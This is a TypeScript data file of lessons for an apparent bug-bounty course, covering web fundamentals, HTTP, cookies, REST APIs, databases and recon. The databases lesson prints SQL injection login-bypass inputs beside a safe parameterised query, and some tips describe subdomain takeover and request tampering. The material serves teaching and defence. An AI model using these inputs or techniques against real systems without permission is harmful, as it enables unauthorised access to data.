export interface LessonSection {
  type: 'heading' | 'subheading' | 'text' | 'callout' | 'analogy' | 'table' | 'code' | 'list' | 'knowledge-check' | 'mermaid' | 'architecture-svg' | 'canvas-animation' | 'concept-chart';
  content?: string;
  items?: string[];
  headers?: string[];
  rows?: string[][];
  variant?: 'info' | 'warning' | 'tip' | 'example' | 'definition';
  label?: string;
  chartType?: string;
  animationType?: string;
  svgType?: string;
}

export interface LessonTopic {
  id: string;
  title: string;
  emoji: string;
  sections: LessonSection[];
}

const lessons: Record<string, LessonTopic> = {};

// ======================== LEVEL 1 ========================

lessons['what-is-the-internet'] = {
  id: 'what-is-the-internet',
  title: 'What is the Internet?',
  emoji: '🌐',
  sections: [
    { type: 'heading', content: 'What is the Internet?' },
    { type: 'text', content: 'The Internet is a global system of interconnected computer networks that use the standard Internet Protocol Suite (TCP/IP) to link devices worldwide. It is a network of networks — millions of private, public, academic, business, and government networks connected by electronic, wireless, and optical networking technologies.' },
    { type: 'callout', variant: 'definition', content: '**Internet**: A global network connecting millions of computers, servers, phones, and smart devices, allowing them to communicate and share information.' },
    { type: 'subheading', content: 'A Simple Analogy: The Postal System' },
    { type: 'text', content: 'Imagine you want to send a letter to a friend in another city. You write the letter, put it in an envelope, write the address, drop it at the post office, and the postal system delivers it. The Internet works the same way — but instead of physical letters, computers send digital data called "packets."' },
    { type: 'table', headers: ['Postal System', 'Internet Equivalent'], rows: [
      ['Letter', 'Data Packet'],
      ['Envelope', 'Packet Header (contains addresses)'],
      ['Your Home Address', 'IP Address (source)'],
      ['Friend\'s Address', 'IP Address (destination)'],
      ['Post Office', 'Router / Network Switch'],
      ['Mail Truck', 'Network Cable / Wi-Fi Signal'],
      ['Postal Worker', 'Protocol (TCP/IP rules)'],
    ]},
    { type: 'subheading', content: 'Why Was the Internet Created?' },
    { type: 'text', content: 'The Internet began in the 1960s as ARPANET, a U.S. Department of Defense project. The goal was to create a communication network that could survive a nuclear attack — if one route was destroyed, data could automatically take another path. This "decentralized" design is why the Internet is so resilient today. By the 1990s, the World Wide Web (invented by Tim Berners-Lee) turned the Internet into a user-friendly system of linked pages accessed through browsers.' },
    { type: 'callout', variant: 'info', content: '**Key Insight**: The Internet = the physical/network infrastructure. The World Wide Web = the collection of web pages and content that runs ON TOP of the Internet. Think of the Internet as the highway system, and the Web as the cars driving on it.' },
    { type: 'subheading', content: 'How Computers Communicate' },
    { type: 'text', content: 'Computers communicate by sending and receiving data in small chunks called packets. Each packet contains a piece of the message, plus addressing information (like the sender and receiver IP addresses). Packets travel independently and may take different routes to reach the destination, where they are reassembled into the original message.' },
    { type: 'subheading', content: 'What Happens When You Open a Website?' },
    { type: 'text', content: 'When you type "google.com" into your browser and press Enter, a remarkable sequence of events happens in milliseconds:' },
    { type: 'list', items: [
      '**Step 1: DNS Lookup** — Your browser asks the DNS (Domain Name System) "What is the IP address of google.com?" DNS responds with an IP like 142.250.190.46.',
      '**Step 2: TCP Connection** — Your browser opens a connection to that IP address on port 443 (for HTTPS). This is like dialing a phone number.',
      '**Step 3: TLS Handshake** — If using HTTPS, your browser and the server perform a secure handshake to establish encryption. They agree on a secret key that only they know.',
      '**Step 4: HTTP Request** — Your browser sends an HTTP GET request asking for the webpage: "GET / HTTP/1.1" with headers like your browser type and accepted languages.',
      '**Step 5: Server Processing** — Google\'s server receives the request, processes it (might query databases, personalize content), and prepares a response.',
      '**Step 6: HTTP Response** — The server sends back the webpage content: HTML (structure), CSS (styling), and JavaScript (interactivity).',
      '**Step 7: Browser Rendering** — Your browser parses the HTML, applies CSS styles, executes JavaScript, and renders the visual page you see.',
      '**Step 8: Additional Requests** — The browser discovers it needs images, fonts, and other resources, and sends more requests for each one.',
    ]},
    { type: 'mermaid', chartType: 'sequenceDiagram', content: `sequenceDiagram
    participant Browser
    participant DNS
    participant Server
    Browser->>DNS: What is google.com?
    DNS-->>Browser: IP: 142.250.190.46
    Browser->>Server: TCP Connect (SYN)
    Server-->>Browser: TCP Accept (SYN-ACK)
    Browser->>Server: ACK
    Browser->>Server: TLS Handshake
    Server-->>Browser: Certificate
    Browser->>Server: HTTP GET /
    Server-->>Browser: HTML + CSS + JS
    Note over Browser: Renders the page` },
    { type: 'canvas-animation', animationType: 'request-flow', content: 'Request Flow Animation' },
    { type: 'subheading', content: 'Client and Server Concepts' },
    { type: 'text', content: 'The Internet operates on a client-server model. A client is any device or application that requests data or services. A server is a powerful computer or program that provides data or services to clients. Your browser (Chrome, Firefox, Safari) is a client. When you check email, your email app is the client that talks to the email server.' },
    { type: 'callout', variant: 'example', content: '**Real-World Example**: When you open Instagram, your phone (client) sends a request to Instagram\'s servers asking for your feed. The servers query their databases for recent posts from people you follow, format them into a nice JSON response, and send it back. Your phone then displays the posts. Instagram doesn\'t send the ENTIRE app — just the data, and your phone renders it.' },
    { type: 'subheading', content: 'DNS Resolution Process — Deep Dive' },
    { type: 'text', content: 'DNS is often called "the phonebook of the Internet." When you type a domain name, DNS converts it to an IP address so computers can find each other. Here\'s the full path:' },
    { type: 'list', items: [
      '**Browser Cache**: Your browser first checks if it already knows the IP from a recent visit.',
      '**OS Cache**: If not found, your operating system checks its own DNS cache.',
      '**Router Cache**: Your Wi-Fi router may have cached DNS results from other devices.',
      '**ISP DNS Server**: If none found, your Internet Service Provider\'s DNS server is queried (usually very fast).',
      '**Recursive Query**: If the ISP doesn\'t know, it queries the Root DNS servers, then TLD servers (.com, .org), then the Authoritative DNS server for that domain.',
      '**Response**: The IP is returned through the chain, cached at each level, and delivered to your browser.',
    ]},
    { type: 'table', headers: ['DNS Component', 'Role', 'Example'], rows: [
      ['Root Server', 'Knows where to find TLD servers', 'a.root-servers.net'],
      ['TLD Server', 'Manages .com, .org, .net etc.', 'gtld-servers.net'],
      ['Authoritative Server', 'Has the actual DNS records for a domain', 'ns1.google.com'],
      ['Recursive Resolver', 'Your ISP\'s DNS that does the searching', 'Your ISP\'s DNS'],
      ['Stub Resolver', 'Built into your OS/browser', 'Your Computer'],
    ]},
    { type: 'subheading', content: 'HTTP and HTTPS Basics' },
    { type: 'text', content: 'HTTP (HyperText Transfer Protocol) is the language computers use to communicate on the web. It\'s a set of rules that defines how messages are formatted and transmitted. HTTPS is HTTP with SSL/TLS encryption added — think of it as HTTP inside a secure tunnel.' },
    { type: 'table', headers: ['Feature', 'HTTP', 'HTTPS'], rows: [
      ['Full Name', 'HyperText Transfer Protocol', 'HyperText Transfer Protocol Secure'],
      ['Encryption', 'None — plain text', 'SSL/TLS encryption'],
      ['Default Port', '80', '443'],
      ['Data Visibility', 'Anyone can read it', 'Only sender and receiver'],
      ['Trust', 'No verification', 'Certificate-based verification'],
      ['Padlock in Browser', 'No', 'Yes'],
      ['Performance', 'Slightly faster', 'Slightly slower (encryption overhead)'],
      ['SEO Ranking', 'Penalized by Google', 'Boosted by Google'],
    ]},
    { type: 'callout', variant: 'warning', content: '**Security Warning**: Never enter passwords, credit card numbers, or personal information on HTTP websites. Anyone on the same Wi-Fi network (coffee shop, airport, hotel) can sniff your traffic using free tools like Wireshark. Always look for the padlock icon in your browser.' },
    { type: 'subheading', content: 'Data Packet Movement' },
    { type: 'text', content: 'Data doesn\'t travel as one big chunk. It\'s broken into small packets (usually 1500 bytes each). Each packet contains: a header (source IP, destination IP, sequence number), the payload (part of the actual data), and a trailer (error checking). This packet-switching approach makes the Internet efficient — if one packet is lost, only that packet needs to be resent, not the entire file.' },
    { type: 'subheading', content: 'Knowledge Check' },
    { type: 'knowledge-check', content: 'What is the primary role of DNS on the Internet?', items: ['To encrypt data between computers', 'To translate domain names into IP addresses', 'To host websites and web applications', 'To provide power to network equipment'], label: 'A' },
    { type: 'knowledge-check', content: 'If you see "https://" in a URL, what does the "s" indicate?', items: ['The site is fast', 'The connection is secure with encryption', 'The site has been verified as safe by Google', 'The site uses a special server'], label: 'B' },
  ],
};

lessons['dns-basics'] = {
  id: 'dns-basics',
  title: 'DNS Basics',
  emoji: '📞',
  sections: [
    { type: 'heading', content: 'DNS Basics — The Internet\'s Phonebook' },
    { type: 'text', content: 'The Domain Name System (DNS) is one of the most critical components of the Internet. Without DNS, you would need to memorize long strings of numbers (IP addresses) for every website you want to visit. DNS translates human-friendly domain names like "google.com" into machine-readable IP addresses like "142.250.190.46."' },
    { type: 'callout', variant: 'definition', content: '**DNS (Domain Name System)**: A hierarchical, decentralized naming system that converts domain names to IP addresses. Often called "the phonebook of the Internet."' },
    { type: 'subheading', content: 'Why DNS Matters in Cybersecurity' },
    { type: 'text', content: 'DNS is a frequent target and tool in cybersecurity. Attackers use DNS for data exfiltration (sending stolen data through DNS queries), DNS poisoning (corrupting DNS caches to redirect users to fake sites), and domain generation algorithms (DGA) for malware command-and-control. As a bug bounty hunter, understanding DNS helps you find subdomain takeover vulnerabilities, DNS misconfigurations, and information disclosure through DNS records.' },
    { type: 'subheading', content: 'DNS Record Types' },
    { type: 'table', headers: ['Record Type', 'Purpose', 'Example'], rows: [
      ['A', 'Maps domain to IPv4 address', 'google.com → 142.250.190.46'],
      ['AAAA', 'Maps domain to IPv6 address', 'google.com → 2607:f8b0:4004:800::200e'],
      ['CNAME', 'Alias of one domain to another', 'www.example.com → example.com'],
      ['MX', 'Mail exchange server', 'example.com → mail.example.com'],
      ['TXT', 'Text data (SPF, DKIM, verification)', 'v=spf1 include:_spf.google.com ~all'],
      ['NS', 'Name server for the domain', 'example.com → ns1.example.com'],
      ['SOA', 'Start of Authority - admin info', 'Primary name server, admin email'],
      ['SRV', 'Service location', '_sip._tcp.example.com → 10 5 5060'],
    ]},
    { type: 'architecture-svg', svgType: 'dns-resolution', content: 'DNS Resolution Architecture' },
    { type: 'mermaid', chartType: 'flowchart', content: `flowchart TD
    A[Browser] --> B{Cache?}
    B -->|No| C[OS Cache]
    C --> D{Router Cache?}
    D -->|No| E[ISP DNS]
    E --> F[Root Server]
    F --> G[.com TLD]
    G --> H[Authoritative DNS]
    H --> I[IP Address]
    I --> J[Browser connects to server]
    B -->|Yes| J
    C -->|Yes| J
    D -->|Yes| J` },
    { type: 'callout', variant: 'warning', content: '**Bug Bounty Tip**: Always check for DNS misconfigurations. Subdomain takeover occurs when a DNS CNAME record points to a service (like AWS S3, GitHub Pages, Heroku) that no longer exists. You can claim the service and host your own content there — a high-severity finding!' },
  ],
};

lessons['http-vs-https'] = {
  id: 'http-vs-https',
  title: 'HTTP vs HTTPS',
  emoji: '🔒',
  sections: [
    { type: 'heading', content: 'HTTP vs HTTPS — The Secure Web' },
    { type: 'text', content: 'HTTP (HyperText Transfer Protocol) is the foundation of data communication on the World Wide Web. Every time you visit a website, your browser sends HTTP requests and receives HTTP responses. HTTPS (HTTP Secure) is the encrypted version — it wraps HTTP traffic in SSL/TLS encryption, protecting data from eavesdropping, tampering, and forgery.' },
    { type: 'subheading', content: 'How HTTP Works' },
    { type: 'text', content: 'HTTP is a request-response protocol. A client (browser) sends a request to a server, and the server sends back a response. The request includes: a method (GET, POST, etc.), a path (/index.html), headers (metadata), and optionally a body (for POST requests). The response includes: a status code (200 OK, 404 Not Found), headers, and a body (the actual content).' },
    { type: 'code', content: `// Example HTTP Request
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html

// Example HTTP Response
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234

<html>
  <body>
    <h1>Hello World!</h1>
  </body>
</html>` },
    { type: 'mermaid', chartType: 'sequenceDiagram', content: `sequenceDiagram
    participant Client
    participant Server
    Client->>Server: HTTP GET /page
    Server-->>Client: HTTP 200 OK + HTML (plain text)
    Note over Client,Server: HTTP = readable by anyone
    
    Client->>Server: HTTPS GET /page (encrypted)
    Server-->>Client: HTTPS 200 OK + encrypted HTML
    Note over Client,Server: HTTPS = encrypted, safe from eavesdropping` },
    { type: 'subheading', content: 'How HTTPS Encryption Works (TLS Handshake)' },
    { type: 'text', content: 'HTTPS uses TLS (Transport Layer Security) to encrypt data. The TLS handshake is the process where client and server agree on encryption keys:' },
    { type: 'list', items: [
      '**Client Hello**: Browser sends supported cipher suites and a random number.',
      '**Server Hello**: Server picks a cipher and sends its digital certificate (contains public key) and another random number.',
      '**Certificate Verification**: Browser checks the certificate is valid (not expired, trusted CA, matches domain). If invalid, browser shows a warning.',
      '**Key Exchange**: Browser generates a "pre-master secret," encrypts it with the server\'s public key, and sends it. Only the server can decrypt it (with its private key).',
      '**Session Keys**: Both sides use the pre-master secret and random numbers to generate the same session keys.',
      '**Secure Communication**: All subsequent data is encrypted with symmetric session keys.',
    ]},
    { type: 'callout', variant: 'tip', content: '**Bug Bounty Tip**: Mixed content warnings happen when an HTTPS page loads HTTP resources (images, scripts, stylesheets). Attackers can intercept HTTP resources and inject malicious code. Always check for mixed content during bug bounty assessments.' },
  ],
};

lessons['client-vs-server'] = {
  id: 'client-vs-server',
  title: 'Client vs Server',
  emoji: '💻',
  sections: [
    { type: 'heading', content: 'Client vs Server — The Web\'s Dynamic Duo' },
    { type: 'text', content: 'The client-server model is the architectural foundation of the modern web. Understanding this relationship is crucial because virtually every web vulnerability exists in the communication between these two entities.' },
    { type: 'subheading', content: 'What is a Client?' },
    { type: 'text', content: 'A client is any device or software application that requests services or resources from a server. The client initiates communication. In web terms, your browser (Chrome, Firefox, Safari) is a client. But clients can also be mobile apps, desktop applications, game consoles, smart TVs, IoT devices, or API consumers.' },
    { type: 'subheading', content: 'What is a Server?' },
    { type: 'text', content: 'A server is a computer or software that provides services, resources, data, or functionality to clients. Servers are always running and listening for client requests. They are typically more powerful than client devices and are designed for reliability, performance, and security.' },
    { type: 'architecture-svg', svgType: 'client-server', content: 'Client-Server Architecture' },
    { type: 'architecture-svg', svgType: 'three-tier', content: 'Three-Tier Architecture' },
    { type: 'mermaid', chartType: 'flowchart', content: `flowchart LR
    subgraph Client Side
    A[Browser] --> B[React / HTML / CSS]
    end
    subgraph Server Side
    C[Web Server] --> D[Application Logic]
    D --> E[Database]
    end
    B <--> |HTTP/HTTPS| C` },
    { type: 'table', headers: ['Aspect', 'Client', 'Server'], rows: [
      ['Role', 'Requests data', 'Provides data'],
      ['Who starts?', 'Client initiates', 'Server waits/listens'],
      ['Examples', 'Browser, mobile app, curl', 'Apache, Nginx, Node.js'],
      ['Security Risk', 'XSS, CSRF (attacks the user)', 'SQLi, IDOR, RCE (attacks the server)'],
      ['Where code runs', 'On user\'s device', 'In the cloud/data center'],
      ['Visibility to user', 'Full access', 'Limited (only what server sends)'],
    ]},
    { type: 'callout', variant: 'example', content: '**Analogy**: A restaurant. You (the client) look at the menu, place an order (request), and the chef (server) prepares your food and serves it (response). The kitchen is hidden — you don\'t see how the food is prepared, you only get the final result. This hiding of server logic is called the "server-side" — and where most security vulnerabilities live.' },
  ],
};

lessons['how-websites-load'] = {
  id: 'how-websites-load',
  title: 'How Websites Load',
  emoji: '📄',
  sections: [
    { type: 'heading', content: 'How Websites Load' },
    { type: 'text', content: 'When you navigate to a website, your browser goes through a complex pipeline to transform raw code into the beautiful visual page you see. Understanding this pipeline is essential for bug bounty hunters because each step presents potential vulnerabilities.' },
    { type: 'subheading', content: 'The Three Core Technologies' },
    { type: 'text', content: 'Every website is built on three foundational technologies:' },
    { type: 'table', headers: ['Technology', 'Analogy', 'What It Does', 'Vulnerability'], rows: [
      ['HTML', 'Skeleton/Bones', 'Structure and content of the page', 'HTML injection, XSS'],
      ['CSS', 'Skin/Clothing', 'Visual styling, layout, animations', 'CSS injection, data exfiltration'],
      ['JavaScript', 'Muscles/Nervous System', 'Interactivity, dynamic behavior, API calls', 'XSS, DOM manipulation, CSRF'],
    ]},
    { type: 'subheading', content: 'The Rendering Pipeline' },
    { type: 'list', items: [
      '**Parse HTML**: Browser reads raw HTML byte by byte, converting it to tokens, then to a DOM tree (Document Object Model).',
      '**Parse CSS**: Browser reads CSS files and constructs the CSSOM (CSS Object Model) tree.',
      '**Create Render Tree**: DOM + CSSOM are combined into the Render Tree — visible elements with their computed styles.',
      '**Layout**: Browser calculates exact positions and sizes of every element. This is called "reflow."',
      '**Paint**: Browser fills pixels — backgrounds, borders, text, images.',
      '**Composite**: Different layers are merged and rendered on screen.',
    ]},
    { type: 'callout', variant: 'warning', content: '**Bug Bounty Target**: JavaScript files often contain hidden API endpoints, access tokens, secret keys, and internal application logic. Always view page source and check all .js files during recon!' },
  ],
};

// ======================== LEVEL 2 ========================

lessons['request-methods'] = {
  id: 'request-methods',
  title: 'HTTP Request Methods',
  emoji: '📮',
  sections: [
    { type: 'heading', content: 'HTTP Request Methods' },
    { type: 'text', content: 'HTTP request methods (also called HTTP verbs) tell the server what action the client wants to perform. Each method has a specific purpose, safety property, and security implications. Understanding these methods is critical for API testing and finding authorization vulnerabilities.' },
    { type: 'subheading', content: 'The Core HTTP Methods' },
    { type: 'table', headers: ['Method', 'Purpose', 'Safe?', 'Idempotent?', 'Has Body?'], rows: [
      ['GET', 'Retrieve a resource', 'Yes', 'Yes', 'No'],
      ['POST', 'Create a resource or submit data', 'No', 'No', 'Yes'],
      ['PUT', 'Update/replace a resource entirely', 'No', 'Yes', 'Yes'],
      ['PATCH', 'Partially update a resource', 'No', 'No', 'Yes'],
      ['DELETE', 'Remove a resource', 'No', 'Yes', 'No'],
      ['HEAD', 'Same as GET but without body (get headers)', 'Yes', 'Yes', 'No'],
      ['OPTIONS', 'Ask what methods are allowed', 'Yes', 'Yes', 'No'],
    ]},
    { type: 'callout', variant: 'info', content: '**Key Terms**: *Safe* = doesn\'t change server state. *Idempotent* = doing it multiple times has the same effect as doing it once.' },
    { type: 'subheading', content: 'Bug Bounty — Method Testing' },
    { type: 'text', content: 'Attackers often test what happens when HTTP methods are used incorrectly. Common tests include:' },
    { type: 'list', items: [
      '**Method Override**: Using X-HTTP-Method-Override header to bypass restrictions.',
      '**Cross-Site Request Forgery (CSRF)**: Submitting POST requests from external sites.',
      '**Mass Assignment**: Sending PUT/PATCH requests with unexpected fields.',
      '**Method Confusion**: Using GET requests that change data (should not happen).',
      '**OPTIONS Disclosure**: The OPTIONS method reveals what methods are allowed — attackers look for DELETE, PUT, or PATCH when they shouldn\'t be available.',
    ]},
    { type: 'code', content: `# Testing OPTIONS to discover allowed methods
curl -X OPTIONS https://api.target.com/resource -v

# Response might show:
Allow: GET, POST, PUT, DELETE, OPTIONS
# If DELETE is listed but the endpoint shouldn't allow deletion...` },
  ],
};

lessons['headers-and-cookies'] = {
  id: 'headers-and-cookies',
  title: 'HTTP Headers & Cookies',
  emoji: '🧢',
  sections: [
    { type: 'heading', content: 'HTTP Headers & Cookies' },
    { type: 'text', content: 'HTTP headers carry metadata about the request or response — they tell the server about the client, describe the content, control caching, handle authentication, and implement security policies. Cookies are small pieces of data that servers send to browsers, which browsers store and send back with subsequent requests to maintain state.' },
    { type: 'subheading', content: 'Important Security Headers' },
    { type: 'table', headers: ['Header', 'What It Does', 'What Happens If Missing'], rows: [
      ['Content-Security-Policy (CSP)', 'Controls what resources can load', 'XSS attacks, data injection'],
      ['Strict-Transport-Security (HSTS)', 'Forces HTTPS connections', 'SSL stripping attacks'],
      ['X-Content-Type-Options: nosniff', 'Prevents MIME type sniffing', 'Drive-by download attacks'],
      ['X-Frame-Options: DENY', 'Prevents page being loaded in iframe', 'Clickjacking attacks'],
      ['Set-Cookie: HttpOnly', 'Prevents JS from reading cookie', 'Cookie theft via XSS'],
      ['Set-Cookie: Secure', 'Cookie only sent over HTTPS', 'Cookie interception on HTTP'],
      ['Set-Cookie: SameSite', 'Controls cross-site cookie sending', 'CSRF attacks'],
    ]},
    { type: 'callout', variant: 'warning', content: '**Critical**: During a bug bounty assessment, always check the response headers. Missing security headers can be reported as medium-to-low severity findings. Missing CSP with confirmed XSS can be a critical chain!' },
    { type: 'subheading', content: 'Cookie Attributes Deep Dive' },
    { type: 'text', content: 'When a server sets a cookie, it can include these attributes that control the cookie\'s behavior:' },
    { type: 'list', items: [
      '**Expires / Max-Age**: When the cookie should be deleted. Session cookies (no expiry) are deleted when the browser closes.',
      '**Domain**: Which domains can receive this cookie. Browsers will NOT send a cookie to a different domain.',
      '**Path**: Which URL path must match for the cookie to be sent. /admin sends cookie to /admin/settings but not /blog.',
      '**Secure**: Cookie is only sent over HTTPS connections.',
      '**HttpOnly**: Cookie cannot be accessed by JavaScript (document.cookie). Critical for XSS protection.',
      '**SameSite=Strict**: Cookie is never sent on cross-site requests. Best for CSRF protection.',
      '**SameSite=Lax**: Cookie is sent on top-level navigation GET requests. Default in modern browsers.',
      '**SameSite=None**: Cookie is sent on all cross-site requests. Must also use Secure flag.',
    ]},
  ],
};

lessons['status-codes'] = {
  id: 'status-codes',
  title: 'HTTP Status Codes',
  emoji: '🏷️',
  sections: [
    { type: 'heading', content: 'HTTP Status Codes' },
    { type: 'text', content: 'HTTP status codes are three-digit numbers returned by the server in response to a client request. They summarize the outcome of the request. For bug bounty hunters, unexpected or misconfigured status codes can reveal vulnerabilities.' },
    { type: 'subheading', content: 'Status Code Categories' },
    { type: 'table', headers: ['Code Range', 'Category', 'Meaning', 'Example'], rows: [
      ['1xx', 'Informational', 'Request received, continuing', '100 Continue'],
      ['2xx', 'Success', 'Request received, understood, accepted', '200 OK, 201 Created'],
      ['3xx', 'Redirection', 'Further action needed', '301 Moved, 302 Found'],
      ['4xx', 'Client Error', 'Request has bad syntax or can\'t be fulfilled', '403 Forbidden, 404 Not Found'],
      ['5xx', 'Server Error', 'Server failed to fulfill a valid request', '500 Internal Server Error'],
    ]},
    { type: 'subheading', content: 'Bug Bounty — Interesting Status Codes' },
    { type: 'list', items: [
      '**200 OK on unauthorized access** — You accessed /admin without being admin and got 200? That\'s a privilege escalation bug.',
      '**403 Forbidden with directory listing** — May reveal file/folder names through error messages.',
      '**405 Method Not Allowed** — Shows which methods ARE allowed in the Allow header.',
      '**500 Internal Server Error with stack trace** — Can leak database structure, file paths, and code logic.',
      '**302 Redirect without auth check** — May skip authorization checks or leak redirect URLs.',
      '**401 vs 403** — 401 means "not authenticated" (login required), 403 means "not authorized" (wrong permissions). Testing the difference can reveal username enumeration.',
    ]},
    { type: 'callout', variant: 'example', content: '**Real Case**: A bug bounty hunter found that an API endpoint returned 200 OK with full admin data when only the role parameter was changed in the JWT token — no actual authorization check on the server side. The server trusted the client\'s claimed role. This was a critical privilege escalation finding.' },
  ],
};

// ======================== LEVEL 3 ========================

lessons['frontend-vs-backend'] = {
  id: 'frontend-vs-backend',
  title: 'Frontend vs Backend',
  emoji: '🎨',
  sections: [
    { type: 'heading', content: 'Frontend vs Backend' },
    { type: 'text', content: 'Modern web applications are divided into two distinct layers: the frontend (what users see and interact with) and the backend (the hidden logic, data processing, and storage). Understanding this separation is essential for bug bounty hunting because vulnerabilities in each layer require different testing approaches.' },
    { type: 'table', headers: ['Aspect', 'Frontend', 'Backend'], rows: [
      ['Where it runs', 'Browser (user\'s device)', 'Server (data center)'],
      ['Technologies', 'HTML, CSS, JavaScript, React, Vue', 'Python, Node.js, Java, PHP, Ruby'],
      ['User can see code?', 'Yes — view page source', 'No — only server response'],
      ['Security focus', 'XSS, CSRF, clickjacking', 'SQLi, IDOR, RCE, authentication'],
      ['Who controls it?', 'Partially user (extensions, devtools)', 'Organization (full control)'],
      ['Validation', 'Client-side (easily bypassed)', 'Server-side (authoritative)'],
    ]},
    { type: 'callout', variant: 'warning', content: '**Golden Rule**: Never trust the frontend. Any validation or security check in JavaScript can be bypassed. An attacker can modify JavaScript, intercept network requests, or send raw HTTP requests directly to the server. All security-critical checks MUST be done server-side.' },
    { type: 'subheading', content: 'Why Client-Side Validation is Not Security' },
    { type: 'text', content: 'Many websites implement form validation in JavaScript — checking that email format is correct, passwords meet requirements, or quantities are positive numbers. This is for USER EXPERIENCE, not security. Attackers can:' },
    { type: 'list', items: [
      '**Disable JavaScript** entirely and submit forms directly.',
      '**Use browser devtools** to modify JavaScript variables and functions.',
      '**Intercept requests** with Burp Suite and modify data before forwarding.',
      '**Send direct HTTP requests** using curl, Postman, or custom scripts.',
      '**Modify the HTML** to remove input restrictions like maxlength or required.',
    ]},
    { type: 'callout', variant: 'example', content: '**Scenario**: An e-commerce site limits quantity to 5 in the frontend dropdown. But the API accepts any number. An attacker intercepts the request, changes quantity to -1000, and the price becomes negative — the attacker gets paid to "buy" items. This is a business logic vulnerability caused by trusting frontend validation.' },
  ],
};

lessons['rest-apis'] = {
  id: 'rest-apis',
  title: 'REST APIs',
  emoji: '🔌',
  sections: [
    { type: 'heading', content: 'REST APIs — The Backbone of Modern Web Apps' },
    { type: 'text', content: 'REST (Representational State Transfer) APIs are the most common way modern applications communicate. Instead of rendering full HTML pages, many apps use JavaScript to call APIs and update the page dynamically. This creates a massive attack surface for bug bounty hunters.' },
    { type: 'subheading', content: 'REST API Principles' },
    { type: 'list', items: [
      '**Stateless**: Each request contains all information needed. Server doesn\'t store client state.',
      '**Resource-Based**: Everything is a resource (/users, /posts, /orders) identified by URLs.',
      '**HTTP Methods as Verbs**: GET=fetch, POST=create, PUT=update, DELETE=remove.',
      '**JSON/XML Responses**: Data is typically returned as JSON (most common) or XML.',
      '**Idempotent Operations**: GET, PUT, DELETE produce same result regardless of how many times called.',
    ]},
    { type: 'table', headers: ['Endpoint', 'HTTP Method', 'Action', 'Auth Required'], rows: [
      ['/api/users', 'GET', 'List all users', 'Admin'],
      ['/api/users', 'POST', 'Create a new user', 'Public (registration)'],
      ['/api/users/123', 'GET', 'Get user 123\'s details', 'Self or Admin'],
      ['/api/users/123', 'PUT', 'Update user 123', 'Own user or Admin'],
      ['/api/users/123', 'DELETE', 'Delete user 123', 'Admin only'],
      ['/api/users/123/orders', 'GET', 'Get user 123\'s orders', 'Self or Admin'],
      ['/api/search?q=term', 'GET', 'Search resources', 'Usually Public'],
    ]},
    { type: 'callout', variant: 'info', content: '**Key Concept**: REST APIs expose "endpoints" — URLs that accept HTTP requests. Each endpoint represents a specific resource or collection. Finding undocumented endpoints during recon can reveal hidden functionality and potential vulnerabilities.' },
    { type: 'subheading', content: 'Common API Vulnerabilities' },
    { type: 'list', items: [
      '**Broken Object Level Authorization (BOLA/IDOR)**: User A can access User B\'s data by changing an ID.',
      '**Mass Assignment**: Sending extra fields (is_admin: true) gets saved to the database.',
      '**Excessive Data Exposure**: API returns sensitive fields (passwords, tokens, internal IDs).',
      '**Rate Limiting Abuse**: No limit on requests allows brute force, enumeration, or DoS.',
      '**Improper Assets Management**: Old API versions (v1, v2) still accessible without security fixes.',
      '**Broken Function Level Authorization**: Regular user can call admin-only endpoints.',
    ]},
  ],
};

lessons['databases-overview'] = {
  id: 'databases-overview',
  title: 'Databases Overview',
  emoji: '🗄️',
  sections: [
    { type: 'heading', content: 'Databases Overview' },
    { type: 'text', content: 'Databases are organized collections of data that applications use to store, retrieve, and manipulate information. Every significant web application uses one or more databases. Understanding databases is crucial for bug bounty hunters because database vulnerabilities (especially SQL injection) are among the most critical security flaws.' },
    { type: 'subheading', content: 'SQL vs NoSQL Databases' },
    { type: 'table', headers: ['Aspect', 'SQL (Relational)', 'NoSQL (Non-Relational)'], rows: [
      ['Data Structure', 'Tables with rows and columns', 'Documents, key-value, graphs'],
      ['Schema', 'Fixed — predefined columns and types', 'Flexible — each document can differ'],
      ['Examples', 'PostgreSQL, MySQL, SQLite, Oracle', 'MongoDB, Firebase, Redis, Cassandra'],
      ['Query Language', 'SQL (Structured Query Language)', 'Language-specific (MongoDB query, etc.)'],
      ['Relationships', 'Foreign keys, JOINs', 'Embedded docs, references'],
      ['ACID Compliance', 'Yes (most)', 'Varies (eventual consistency)'],
      ['Vulnerability Type', 'SQL Injection', 'NoSQL Injection'],
    ]},
    { type: 'subheading', content: 'How SQL Injection Works' },
    { type: 'text', content: 'SQL Injection (SQLi) is one of the most dangerous web vulnerabilities. It occurs when user input is directly concatenated into SQL queries without sanitization or parameterization.' },
    { type: 'code', content: `// VULNERABLE — NEVER DO THIS
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"

// If username = admin' --
// The query becomes:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
// The -- comments out the password check. Login bypass!

// If username = ' OR 1=1 --
// The query becomes:
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
// Returns ALL users. Authentication bypass!

// SAFE — Parameterized Query (correct approach)
query = "SELECT * FROM users WHERE username = $1 AND password = $2"
// Input is treated as DATA, not executable SQL code` },
    { type: 'callout', variant: 'example', content: '**Real-World Impact**: In 2019, a researcher found a SQL injection in a major travel booking platform. By exploiting the SQLi, they could access the entire user database — millions of records with names, emails, phone numbers, and hashed passwords. This was a critical severity finding with a $10,000+ bounty.' },
  ],
};

// ======================== LEVEL 4 ========================

lessons['reconnaissance-theory'] = {
  id: 'reconnaissance-theory',
  title: 'Reconnaissance Theory',
  emoji: '🕵️',
  sections: [
    { type: 'heading', content: 'Reconnaissance Theory' },
    { type: 'text', content: 'Reconnaissance (recon) is the process of gathering information about a target. In bug bounty, recon is 80% of the work. The quality of your recon directly determines the quality of your findings. Good recon reveals attack surface that others miss.' },
    { type: 'subheading', content: 'Passive vs Active Recon' },
    { type: 'table', headers: ['Aspect', 'Passive Recon', 'Active Recon'], rows: [
      ['Definition', 'Gathering info without touching target systems', 'Interacting with target systems directly'],
      ['Detectable?', 'No — completely stealthy', 'Yes — logs will show your requests'],
      ['Tools', 'Google, Shodan, Censys, WHOIS, GitHub', 'Nmap, Burp Suite, ffuf, gobuster'],
      ['Legal Risks', 'None — public information only', 'Must stay within scope/permissions'],
      ['What You Find', 'Tech stack, subdomains, employees, leaks', 'Open ports, live endpoints, hidden files'],
      ['When to Use', 'Always — start every engagement here', 'After passive recon, within scope limits'],
    ]},
    { type: 'subheading', content: 'The Recon Mindset' },
